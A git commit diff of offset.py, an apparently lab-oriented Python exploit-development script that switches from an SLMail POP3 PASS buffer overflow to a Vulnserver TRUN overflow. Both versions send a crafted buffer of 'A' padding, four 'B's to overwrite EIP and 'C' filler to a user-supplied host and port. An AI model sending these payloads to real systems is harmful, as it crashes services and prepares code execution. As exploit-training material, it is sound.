eec76899d3b68826b82252fb9f259512b4c94e84
Hrishi Ghosalkar <87890571+rookie-cookie-8@users.noreply.github.com>
2024-02-13 11:51:34 +0530

    Update offset.py

--- offset.py
+++ offset.py
@@ -1,29 +1,27 @@
 #!/usr/bin/python3
 
-from time import sleep
 import sys,socket
+from time import sleep
 
-print("**********SLMAIL POP3 vulnerability**********")
+print("**************VULNSERVER- TRUN *************")
 sleep(0.5)
-ip_address=input("Enter the IP address:\n")
-port_number=input("Enter the Port number:\n")
+ip_address=input("ENter the IP address\n")
+port_number=input("Enter the port number\n")
 
-if(len(ip_address)<=0) or (len(port_number)<=0):
-    if(len(ip_address)>0) and (len(port_number)<=0):
-        print("*"*25)
+if (len(ip_address)<=0) or (len(port_number)<=0):
+    if (len(ip_address)>0) and (len(port_number)<=0):
+        print("*" * 30)
         print("Port number field is empty")
-    elif(len(ip_address)<=0) and (len(port_number)>0):
-        print("*"*25)
-        print("IP addres field is empty")
+    elif (len(ip_address)<=0) and (len(port_number)>0):
+        print("*" * 30)
+        print("IP address field is empty")
     else:
-        print("*"*25)
+        print("*" * 30)
         print("Issues with the user input")
 
-elif(len(ip_address)>0) and (len(port_number)>0):
-    print("*"*25)
-    buffer=b"A" * 2606 + b"B" * 4 + b"C" * (3100-4-2606)
+elif (len(ip_address)>0) and (len(port_number)>0):
+    buffer=b"A" * 2003 + b"B" * 4 + b"C" *(2400-2003-4)
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect((ip_address, int(port_number)))
-    s.send((b"USER TEST\r\n"))
-    s.send((b"PASS " + buffer + b"\r\n"))
+    s.send((b"TRUN /.:/" + buffer))
     s.close()
